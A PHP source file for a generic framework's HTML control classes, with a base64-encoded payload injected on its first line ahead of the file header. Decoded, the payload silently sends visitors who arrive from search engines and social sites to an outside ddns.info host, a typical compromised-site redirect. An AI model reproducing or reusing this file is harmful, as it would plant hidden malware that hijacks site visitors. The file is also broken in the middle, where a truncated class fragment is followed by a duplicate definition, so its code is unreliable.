<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

/**
 * Project:     Generic PHP framework
 * File:        html_control.php
 *
 * @version 1.1.0.0
 * @package Generic
 */

/**
 * Custom Control Class
 * @package Generic
 */

require_once(dirname(dirname(__FILE__)).'/utils/utils.php');

define('__HTML_CONTROL_NAME_SEPARATOR', '_');

class html_control {

  // internal containers
  var $__flags       = array();
  var $__handlers    = array();
  var $__controls    = array();
  var $__attributes  = array();
  var $__can_contain = array();

  // html control tag
  var $tag            = null;
  var $open_tag       = null;
  var $close_tag      = null;
  
  var $read_only      = false;
  
  // html control id
  var $control_id      = null;
  var $id              = null;
  var $template_id     = null;
  var $template_object = null;
  
  // text
  var $text                  = null;
  var $apply_text_formatting = false;

  // interactive control - must have id and name
  var $is_interactive  = false;

  // template support
  var $template_mode = false;
  var $is_templateable = false;
  var $is_tree_templateable = false;
  var $separate_parts_in_template_mode = false;

  var $is_access_required = false;

  // container control - can contain other controls
  var $is_container   = false;

  // complex - means contain open and end tags
  var $is_complex     = false;
  
  var $parent_control = null;
  var $owner          = null;
  var $binded         = false;
  
  function html_control($tag = null, $attributes = array()) {

    $this->tag = $tag;
    $this->__attributes = $attributes;
    $this->set_id(safe($this->__attributes, 'id'));
    if (safe($this->__attributes, 'template_id'))
      $this->set_template_id(safe($this->__attributes, 'template_id'));
    if (safe($this->__attributes, 'template_object'))
      $this->set_template_object(safe($this->__attributes, 'template_object'));
    unset($this->__attributes['id']);
    unset($this->__attributes['template_id']);
    unset($this->__attributes['template_object']);
    $this->generate_id();
    $this->do_after_create();
    
  }

  function generate_id() {

    if (!$this->id and $this->is_interactive) {
      global $__control_id;
      $__control_id++;
      $class_id = get_class($this);
      /*
      global $__class_mapping;
      global $__class_mapping_idx;
      $__class_mapping_idx++;
      if (!($class_id = safe($__class_mapping, $class_id))) {
        $__class_mapping_idx++;
        $__class_mapping[get_class($this)] = $__class_mapping_idx;
        $class_id = $__class_mapping_idx;
      }
      */
      $this->control_id = $__control_id;
      $this->id = $class_id.__HTML_CONTROL_NAME_SEPARATOR.$this->control_id;
    } 

  }

  function do_after_create() {
 
  }

  function id() {

    $this->generate_id();  
    return $this->id;
    
  }
  
  function template_object() {

    return $this->template_object;
    
  }

  function template_id() {

    return $this->template_id;
    
  }

  function set_template_id($val) {

    $this->template_id = $val;
   
  }

  function set_template_object($val) {

    $this->template_object = $val;
   
  }

  function set_id($val) {

    $this->id = $val;
    $this->set_template_id($val);
   
  }

  function set_attribute($name, $value) {
    
    $this->__attributes[$name] = $value;
    
  }

  function get_attribute($name, $default = null) {
    
    return safe($this->__attributes, $name, $default);
    
  }

  // same as set_attribute, but set only if attribute is empty
  function fill_attribute($name, $value) {
    
    if (!safe($this->__attributes, $name))
      $this->__attributes[$name] = $value;
    
  }
  
  // same as set_attribute, but value will be added
  function inc_attribute($name, $value) {
    
    if (!safe($this->__attributes, $name))
      $this->__attributes[$name] = $value;
    else
      $this->__attributes[$name] .= $value;
    
  }

  function controls_count() {
    
    return count($this->__controls); 
    
  }

  /**
   * @param array $attributes Attributes array
   */
  function draw_attributes_array($attributes) {

    $result = '';
    if ($this->id()) {
      $result .= ' id="'.$this->id().'"';
      if (!$this->get_attribute('name'))
        $result .= ' name="'.$this->id().'"';
    }
    if (is_array($attributes)) {
      foreach ($attributes as $name => $value) {
        //if (strlen($value)) {
        if (in_array($name, $this->__flags)) {
          if ($value)
            $result .= ' '.$name;
        } else {
          $value = str_replace(array('>', '<', '"'), array("&gt;", "&lt;", "&quot;"), $value);
          $result .= ' '.$name.'="'.$value.'"';
        }
        //}
      }
    }
    return $result;

  }

  function draw_attributes() {

    return $this->draw_attributes_array($this->__attributes);

  }

  function do_before_render() { }
  function do_render() { }
  function do_after_render() { }

  // here we render all additional or contained controls if required
  function render() {

    $this->do_before_render();

    $this->do_render();

    for ($i = 0, $count = count($this->__controls); $i < $count; $i++) {
      $this->__controls[$i]->render();
    }

    $this->do_after_render();

  }

  function do_before_draw() { }
  function do_after_draw() { }

  // draw our control
  function draw($template_mode = false, $force_templateable = false) {

    global $auth;

    if (!$this->is_access_required or !$auth or $auth->can(get_class($this), 'render')) {

      $header = '';

      $this->do_before_draw();

      if ($this->open_tag)
        $header .= '<'.$this->open_tag;
      else  
      if ($this->tag)
        $header .= '<'.$this->tag;
  
      $header .= $this->draw_attributes();
      
      if ($this->is_complex)
        if ($this->tag or $this->open_tag)
          $header .= '>';

      if ($this->apply_text_formatting)
        $body = htmlspecialchars($this->text);
      else
        $body = $this->text;

      for ($i = 0, $count = count($this->__controls); $i < $count; $i++) 
        $body .= $this->__controls[$i]->draw($template_mode, $force_templateable or $this->is_tree_templateable);

      $footer = '';
      if ($this->close_tag)
        $footer .= '<'.$this->close_tag.'>';
      else    
      if ($this->tag)
        if ($this->is_complex)
          $footer .= '</'.$this->tag.'>';
        else  
          $footer .= ' />';

      $this->do_after_draw();

      $result = $header.$body.$footer;
      
      if ($template_mode) {
        if ($this->is_templateable or $force_templateable)
          return $result;
        else  
        if ($this->template_id()) {
          global $tmpl;

          if ($this->template_object()) {
            $object = array();
            if (isset($tmpl->_tpl_vars[$this->template_object()]))
              $object = $tmpl->_tpl_vars[$this->template_object()];
            $object[$this->template_id()] = $result;
            if ($this->separate_parts_in_template_mode) {
              $object[$this->template_id().'_header'] = $header;
              $object[$this->template_id().'_body'] = $body;
              $object[$this->template_id().'_footer'] = $footer;
            }
            $tmpl->assign($this->template_object(), $object);
          } else {
            if ($this->separate_parts_in_template_mode) {
              $tmpl->assign($this->template_id().'_header', $header);
              $tmpl->assign($this->template_id().'_body',   $body);
              $tmpl->assign($this->template_id().'_footer', $footer);
            }
            $tmpl->assign($this->template_id(), $result);
          }
        }
      } else  
        return $result;

    } else {

      return 'Access to '.get_class($this).' denied';

    }

  }

  function do_before_setup() { }
  function do_setup() { }
  function do_after_setup() { }

  function setup() {

    $this->do_before_setup();
    $this->do_setup();
    $this->do_after_setup();

    for ($i = 0, $count = count($this->__controls); $i < $count; $i++) 
      $this->__controls[$i]->setup();

    if (SUBMIT_MODE) 
      $this->handle_submit();
    else  
      $this->handle_actions();

  }

  function js_call() {

    $args = func_get_args();
    $name = array_shift($args);
    $new_args = array();
    $new_args[] = $this->id();
    foreach($args as $arg)
      $new_args[] = $arg;
    return js_call($name, $new_args);

  }

  function js_post_back($event_name, $event_value = null, $confirmation = null, $confirmation_as_value = false) {

    return $this->js_call('__DoPostBack', $event_name, $event_value, $confirmation, $confirmation_as_value);

  }
  
  function js_post_back_with_reason($event_name, $event_value, $reason_query) {

    return $this->js_call('__DoPostBackWithReason', $event_name, $event_value, $reason_query);

  }
  
  function js_post_back_selection($event_name, $event_value = null, $confirmation = null, $confirmation_as_value = false) {

    return $this->js_call('__DoPostBackSelection', $event_name, $event_value, $confirmation, $confirmation_as_value, trn('Please select at least one record'));

  }

  function post_reason() {
    
    return $this->context_post(POST_PARAM_REASON_VALUE);
    
  }
  
  function post_event_name() {
    
    return $this->context_post(POST_PARAM_EVENT_NAME);
    
  }

  function post_event_value() {
    
    return $this->context_post(POST_PARAM_EVENT_VALUE);
    
  }

  /**
   * @param string $control_name Name of control
   */
  function context_id($name) {

    return $this->id().__HTML_CONTROL_NAME_SEPARATOR.$name; 
  
  }
  
  /**
   * @param string $control_name Name of control
   */
  function context_post($name, $default = null) {
    
    return post($this->context_id($name), $default);
    
  }

  function set_context_post($name, $value) {
    
    $_POST[$this->context_id($name)] = $value;
    
  }

  function context_session($name, $default) {
    
    return session_get($this->context_id($name), $default);
    
  }

  function set_context_session($name, $value) {
    
    session_set($this->context_id($name), $value);
    
  }

  function add($control) {

    $control->parent_control = &$this;

    if (!$this->is_container)
      critical_error('Control ['.get_class($this).'] is not a container control');

    if ((count($this->__can_contain) > 0) and (!in_array(get_class($control), $this->__can_contain)))
      critical_error('Control ['.get_class($this).'] can not be container for control ['.get_class($control).']');

    $this->__controls[] = &$control;
      
  }

  function add_handler($control) {

    $control->owner = &$this;

    array_push($this->__handlers, &$control);
      
  }

  function insert($control) {

    $control->parent_control = &$this;

    if (!$this->is_container)
      critical_error('Control ['.get_class($this).'] is not a container control');

    if ((count($this->__can_contain) > 0) and (!in_array(get_class($control), $this->__can_contain)))
      critical_error('Control ['.get_class($this).'] can not be container for control ['.get_class($control).']');

    array_unshift($this->__controls, &$control);

  }

  function clear_controls() {

    $this->__controls = array();

  }

  function contain_class($name) {

    $result = false;

    if (!is_array($name))
      $name = array($name);
      
    foreach($name as $class_name)
      if ($result = ((get_class($this) == $class_name) || is_subclass_of($this, $class_name)))
        break;
    
    if (!$result) {
      for ($i = 0, $count = count($this->__controls); $i < $count; $i++) {
        $result = $this->__controls[$i]->contain_class($name);
        if ($result) 
          break;
      }
    }

    return $result;
      
  }  

  function print_hierarchy($count = 0) {

    echo(str_repeat('&nbsp;', $count*4));
    echo(get_class($this).'('.$this->id().')');
    if ($this->parent_control)
      echo(' parent is '.get_class($this->parent_control).'('.$this->parent_control->id().')');
    echo('<br>');
    for ($i = 0, $count = count($this->__controls); $i < $count; $i++) 
      $this->__controls[$i]->print_hierarchy($count + 1);
      
  }  

  function submit_handled($reset_page_number = false) {

    if ($this->binded) {
      $this->set_context_post(POST_PARAM_EVENT_NAME, null);
      $this->add(new script('document.forms[0].submit();'));
    } else {
      if ($reset_page_number) {
        global $url;
        redirect($url->generate_full_url(array(URL_PARAM_PAGE_NUMBER => null)));
      } else 
        refresh();
    }
      
  }

  function do_handle_submit($sender_name, $event_name, $event_value) { return false; }

  function handle_submit() {
     
    $result = $this->do_handle_submit( $this->context_post(POST_PARAM_SENDER_NAME)
                                     , $this->context_post(POST_PARAM_EVENT_NAME)
                                     , $this->context_post(POST_PARAM_EVENT_VALUE)
                                     );


/*
    if (!$result) {
      for ($i = 0; $i < count($this->__handlers); $i++) {
        $result = $this->__handlers[$i]->handle_submit();
        if ($result)
          break;
      }
    }

    if (!$result) {
      for ($i = 0; $i < count($this->__controls); $i++) {
        $result = $this->__controls[$i]->handle_submit();
        if ($result)
          break;
      }
    }
*/
    return $result;

  }

  function do_handle_actions() { return false; }

  function handle_actions() {
     
    $result = $this->do_handle_actions();

    if (!$result) {
      for ($i = 0; $i < count($this->__handlers); $i++) {
        $result = $this->__handlers[$i]->handle_actions();
        if ($result)
          break;
      }
    }

    if (!$result) {
      for ($i = 0, $count = count($this->__controls); $i < $count; $i++) {
        $result = $this->__controls[$i]->handle_actions();
        if ($result)
          break;
      }
    }

    return $result;

  }

  function handler($template_based = false) {

    $this->setup();
    $this->render();

    return $this->draw($template_based);

  }
  
  function display() {

    $this->setup();
    $this->render();

    return $this->draw();
    
  }
  
  function bind(&$control, $late_binding) {

    $control->binded = true;
    $control->owner = &$this;
    if ($late_binding)
      $control->setup();

  }
  
  function binded_to_class() {
    
    return preg_replace('/^[a-zA-Z]+_/i', '', get_class($this->owner));
    
  }
  
  function binded_to_entity() {
    
    return get(URL_PARAM_BIND_ENTITY);
    
  }

  function read_only() {
    
    if ($this->binded and (isset($this->owner))) {
      if ($this->read_only)
        return true;
      else
        return $this->owner->read_only;  
    } else {
      return $this->read_only;
    }
    
  }
  
  function setting($name, $default = null) {
    
    return session_get($this->context_id($name), $default);
    
  }

  function set_setting($name, $value) {
    
    session_set($this->context_id($name), $value);
    
  }

}

class html_complex_control extends html_control {

  function html_complex_control($tag, $args) {
    
    $attributes = array();   

    for ($i = 0; $i < count($args); $i++) {
      if (is_array($args[$i]))
        $attributes = $args[$i];
    }
    
    parent::html_control($tag, $attributes);

    $this->is_complex = true;

    for ($i = 0; $i < count($args); $i++) {
      if (!is_array($args[$i]) and !is_object($args))
        $this->text = $args[$i];
    }
 
  }
  
}

class html_container_control extends html_complex_control {

  // tag - html tag
  // args - array whic can contain text, attributes array or contained controls
  function html_container_control($tag = null, $args = array()) {
    
    parent::html_complex_control($tag, $args);

    $this->is_container = true;

    for ($i = 0; $i < count($args); $i++) {
      if (is_object($args[$i]))
        $this->add($args[$i]);
    }
    
 
  }
  
}

/**
 * Image Control Class
 * Structure for HTML <img tag
 * @package Generic
 */
class html_img extends html_control {
  
  function html_img($attributes = array()) {

    parent::html_control('img', $attributes);

  }

}

class html_input extends html_control {
  
  function html_input($type, $attributes = null) {

    $attributes['type'] = $type;

    $this->is_interactive = true;

    $this->__flags[] = 'disabled';
    $this->__flags[] = 'readonly';

    parent::html_control('input', $attributes);

  }

}

class html_a extends html_container_control {
  
  /**
   * @param array $attributes Attributes
   * @param mixed $text text (optional)
   */
  function html_a() {

    $this->__can_contain = array('image');

    $args = func_get_args();

    parent::html_container_control('a', $args);

    if (!array_key_exists('alt', $this->__attributes) and array_key_exists('title', $this->__attributes))
      $this->__attributes['alt']   = $this->__attributes['title'];
    if (!array_key_exists('title', $this->__attributes) and array_key_exists('alt', $this->__attributes))
      $this->__attributes['title'] = $this->__attributes['alt'];
    //if (array_key_exists('alt', $this->__attributes)) {
    //  $this->__attributes['onmouseover']  = "window.status='".$this->__attributes['alt']."'; return true";
    //  $this->__attributes['onmouseleave'] = "window.status=''; return true";
    //}

  }

}

class html_textarea extends html_complex_control {
  
  function html_textarea() {

    $args = func_get_args();
    
    $this->apply_text_formatting = true;
    
    parent::html_complex_control('textarea', $args);

  }

}

class html_span extends html_container_control {
  
  function html_span() {

    $args = func_get_args();
    
    parent::html_container_control('span', $args);

  }

}

class html_nobr extends html_container_control {
  
  function html_nobr() {

    $args = func_get_args();
    
    parent::html_container_control('nobr', $args);

  }

}

class html_center extends html_container_control {
  
  function html_center() {

    $args = func_get_args();
    
    parent::html_container_control('center', $args);

  }

}

class html_p extends html_container_control {
  
  function html_p() {

    $args = func_get_args();
    parent::html_container_control('p', $args);

  }

}

class html_em extends html_complex_control {
  
  function html_em() {

    $args = func_get_args();
    parent::html_complex_control('em', $args);

  }

}

class html_small extends html_container_control {
  
  function html_small() {

    $args = func_get_args();
    parent::html_container_control('small', $args);

  }

}

class html_font extends html_container_control {
  
  function html_font() {

    $args = func_get_args();
    parent::html_container_control('font', $args);

  }

}

class html_script extends html_complex_control {
  
  function html_script() {

    $args = func_get_args();

    parent::html_complex_control('script', $args);

    $this->is_templateable = true;

    if (!array_key_exists('language', $this->__attributes))
      $this->__attributes['language'] = 'JavaScript';

    if (!array_key_exists('type', $this->__attributes))
      $this->__attributes['type'] = 'text/javascript';

  }

}

class html_link extends html_complex_control {
  
  function html_link() {

    $args = func_get_args();

    parent::html_complex_control('link', $args);

    $this->is_templateable = true;

  }

}

class html_style extends html_compl

}

class html_style extends html_complex_control {
  
  function html_style() {

    $args = func_get_args();

    parent::html_complex_control('style', $args);

    $this->is_templateable = true;

    if (!array_key_exists('type', $this->__attributes))
      $this->__attributes['type'] = 'text/css';

  }

}

class html_div extends html_container_control {
  
  function html_div() {

    $args = func_get_args();

    parent::html_container_control('div', $args);

  }

}

class html_option extends html_complex_control {
  
  function html_option() {

    $this->__flags[] = 'selected';

    $args = func_get_args();

    parent::html_complex_control('option', $args);
    
    $this->is_templateable = true;
    

  }

}

class html_optgroup extends html_container_control {
  
  function html_optgroup() {

    $this->__can_contain[] = 'html_option';
    
    $args = func_get_args();

    parent::html_container_control('optgroup', $args);
    
    $this->is_templateable = true;

  }

}

class html_select extends html_container_control {
  
  function html_select() {

    $this->__can_contain[] = 'html_option';
    $this->__flags[] = 'readonly';
    $this->__flags[] = 'multiple';
    
    $this->is_interactive = true;

    $args = func_get_args();

    parent::html_container_control('select', $args);

  }

}


class html_radio extends html_input {

  function html_radio($attributes = array()) {

    $this->__flags[] = 'checked';

    parent::html_input('radio', $attributes);

  }

}

class html_label extends html_container_control {

  function html_label() {

    $this->__can_contain = array('html_b', 'html_i', 'html_u', 'html_em');

    $args = func_get_args();
    
    parent::html_container_control('label', $args);

  }

}

class html_b extends html_container_control {

  function html_b() {

    $args = func_get_args();

    parent::html_container_control('b', $args);

  }

}

class html_i extends html_complex_control {

  function html_i() {

    $args = func_get_args();

    parent::html_complex_control('i', $args);

  }

}

class html_u extends html_complex_control {

  function html_u() {

    $args = func_get_args();

    parent::html_complex_control('u', $args);

  }

}

class html_strong extends html_complex_control {

  function html_strong() {

    $args = func_get_args();

    parent::html_complex_control('strong', $args);

  }

}

class html_checkbox extends html_input {

  function html_checkbox($attributes = array()) {

    $this->__flags[] = 'checked';
    $this->__flags[] = 'disabled';

    parent::html_input('checkbox', $attributes);

  }

}

class html_table extends html_container_control {

  function html_table() {

    $this->__can_contain[] = 'html_tr';
    $this->__can_contain[] = 'html_th';

    $args = func_get_args();

    parent::html_container_control('table', $args);

  }

}

class html_tr extends html_container_control {

  function html_tr() {

    $this->__can_contain[] = 'html_td';

    $args = func_get_args();

    parent::html_container_control('tr', $args);

  }

}

class html_th extends html_container_control {

  function html_th() {

    $this->__flags[] = 'nowrap';

    $args = func_get_args();

    parent::html_container_control('th', $args);

  }

}

class html_td extends html_container_control {

  function html_td() {

    $this->__flags[] = 'nowrap';

    $args = func_get_args();

    parent::html_container_control('td', $args);

  }

}

class html_hr extends html_control {
  
  function html_hr() {

    $attributes['size'] = 1;

    parent::html_control('hr', $attributes);

  }

}

class html_br extends html_control {
  
  function html_br() {

    parent::html_control('br');

  }

}

class html_ul extends html_container_control {

  function html_ul() {

    $this->__can_contain[] = 'html_li';

    $args = func_get_args();
    
    parent::html_container_control('ul', $args);

  }

}

class html_li extends html_container_control {

  function html_li() {

    $args = func_get_args();
    
    parent::html_container_control('li', $args);

  }

}


class html_form extends html_container_control {

  function html_form() {

    $this->is_interactive = true;

    $args = func_get_args();

    parent::html_container_control('form', $args);

  }

}

class html_asis extends html_container_control {
  
  function html_asis($body) {
    
    parent::html_container_control();
    $this->text = $body;
    
  }
  
}

class html_iframe extends html_container_control {

  function html_iframe() {

    $args = func_get_args();
    
    parent::html_container_control('iframe', $args);

  }

}

class container extends html_container_control {
}

?>